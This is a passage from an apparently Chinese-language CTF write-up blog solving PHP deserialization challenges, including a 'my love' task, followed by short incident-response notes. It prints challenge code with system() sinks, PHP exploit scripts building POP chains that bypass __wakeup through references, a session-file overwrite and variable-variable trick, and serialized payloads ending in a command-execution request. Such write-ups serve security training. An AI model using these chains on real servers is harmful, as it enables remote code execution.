class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/R:2|R:3/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>难度也不高，一个反序列化，只禁了R:2和R:3(和没禁一样)</p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>明显是要触发xk的love函数，但是我们需要尝试绕过wakeup。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们先讲一下什么是引用<br>如下代码<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=&amp;$c</span><br></pre></td></tr></table></figure><br>这个就代表了<code>$a</code>是<code>$c</code>的引用，即他们指向同一个内存，即他们的值会一直相同改a的值c会变反之亦然。<br>链子很短<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b-&gt;a-&gt;xk</span><br></pre></td></tr></table></figure><br>看到这个第一眼就感觉可以使用引用来绕过，在反序列化时会先调用wakeup然后才会调用destruct<code>$a</code>我们看到c会被赋值为no那么我们只要使用引用江c设置为b的引用，那么在后一句对b的赋值时就会成功再一次的对c赋值。这样我们触发destruct时c就为a的值我们可以将啊设置为对象。<br>exp如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c=&amp;<span class="variable">$a</span>-&gt;b;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b=<span class="keyword">new</span> <span class="title function_ invoke__">xk</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b-&gt;a=<span class="string">&quot;ls&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><br>由于其只禁了R2R3<br>我们只要在属性b前面对塞几个属性，即可以变成R5R6之类的反正属性也没什么用</p>
<h1 id="my-love"><a href="#my-love" class="headerlink" title="my love"></a>my love</h1><p>哈哈这题就有意思了，写这题的时候学到了一些关于php session的知识。知道了php的session竟然是以文件的形式进行存储的。下面的学习的文章我就直接贴出来了。<a href="https://www.cnblogs.com/ch459742906/p/6078770.html">phpsession</a><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.|\.php/&quot;</span>,<span class="variable">$this</span>-&gt;man))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;文件名不能有.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;man,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;woman));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/N$/&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$$tmp</span>[<span class="string">&#x27;name&#x27;</span>]==<span class="string">&#x27;your are good!&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok!&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>打开会发现其发生了phpinfo的泄露（但其实没这个必要以为反序列化都可以看到的，直接把题目逼格下一个档次）。那我们能看到信息可就多了。<br>我们先审计一下这个代码，还是反序列化，但是主要考点是一下这串代码。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/N$/&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$$tmp</span>[<span class="string">&#x27;name&#x27;</span>]==<span class="string">&#x27;your are good!&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok!&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以发现其要求<code>$_GET[&#39;test&#39;]</code>的最后一个字符为N,而后赋值给<code>$tmp</code>，最后判断<code>$$tmp[&#39;name&#39;]==&#39;your are good!&#39;</code>我们可以发现其存在变量覆盖，我们只要将<code>$tmp</code>赋值为_SESSION那么<code>$$tmp[name]</code>就是超全局变量<code>$_SESSION[name]</code>而这个值时存储在文件里的，只要能对文件进行修改那么就可以修改<code>$_SESSION[name]</code>的值。</p>
<p>那么我们看一下反序列化的部分<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.|\.php/&quot;</span>,<span class="variable">$this</span>-&gt;man))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;文件名不能有.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;man,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;woman));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以发现其存在下面两个类<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.|\.php/&quot;</span>,<span class="variable">$this</span>-&gt;man))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;文件名不能有.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;man,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;woman));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;·</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>xk类存在一个文件写入函数<br>end类可以触发一个无参函数。<br>而要开启session需要使用session_start函数<br>那么思路就很清楚了</p>
<p>就是先反序列化触发session<em>start再抓包查看PHPSESSID，然后触发文件写入函数来修改session文件<code>（文件内容我们可以再本地自己定义一个$_SESSION[name]=your are good!）</code>，session文件名为sess</em>加上PHPSESEID，之后就是向tmp传入_SESSION，这样就可以通过前面的判断进行命令执行了。</p>
<p>下面是两个pop链的构造exp，构造难度不高考点和上一题一样我就不过多赘述了<br>触发session_start()<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$man</span>=<span class="string">&quot;/var/lib/php/session/sess_84k8e3r5jr78om8diig6uia9br&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$woman</span>=<span class="string">&#x27;bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c=&amp;<span class="variable">$a</span>-&gt;b;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="string">&quot;lalala&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b=<span class="keyword">new</span> <span class="title function_ invoke__">end</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b-&gt;func=<span class="string">&quot;session_start&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><br>文件写入<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$man</span>=<span class="string">&quot;/var/lib/php/session/sess_84k8e3r5jr78om8diig6uia9br&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$woman</span>=<span class="string">&#x27;bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c=&amp;<span class="variable">$a</span>-&gt;b;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="string">&quot;lalala&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b=<span class="keyword">new</span> <span class="title function_ invoke__">xk</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><br>之后就是按之前的思路来打了。<br>文件写入的内容如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name|s:14:&quot;your are good!&quot;;base64编码后就是bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7</span><br></pre></td></tr></table></figure></p>
<p>payload<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;lalala&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;session_start&quot;</span>;&#125;&#125;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;R:<span class="number">6</span>;&#125;</span><br><span class="line"></span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;lalala&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">2</span>:<span class="string">&quot;xk&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;man&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;/var/lib/php/session/sess_84k8e3r5jr78om8diig6uia9br&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;woman&quot;</span>;s:<span class="number">36</span>:<span class="string">&quot;bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7&quot;</span>;&#125;&#125;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;R:<span class="number">7</span>;&#125;</span><br><span class="line"></span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;lalala&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;session_start&quot;</span>;&#125;&#125;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;R:<span class="number">6</span>;&#125;&amp;test=_SESSION&amp;shell=tac%<span class="number">20</span>flag.php</span><br></pre></td></tr></table></figure></p>
<h1 id="应急响应-1"><a href="#应急响应-1" class="headerlink" title="应急响应-1"></a>应急响应-1</h1><img src="/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/2.png" class="" title="alt text">
<p>在标签列表里有flag</p>
<h1 id="应急响应-3"><a href="#应急响应-3" class="headerlink" title="应急响应-3"></a>应急响应-3</h1><img src="/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/3.png" class="">
<p>服务器的命令记录全是这个ip</p>
<h1 id="应急响应-4"><a href="#应急响应-4" class="headerlink" title="应急响应-4"></a>应急响应-4</h1><p>我们看waf的拦截记录可以明显发现这是一个rce漏洞<br>在网上搜jumpserver rce漏洞就可以找到这个cve<br><img src="/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/4.png" class="" title="alt text"></p>
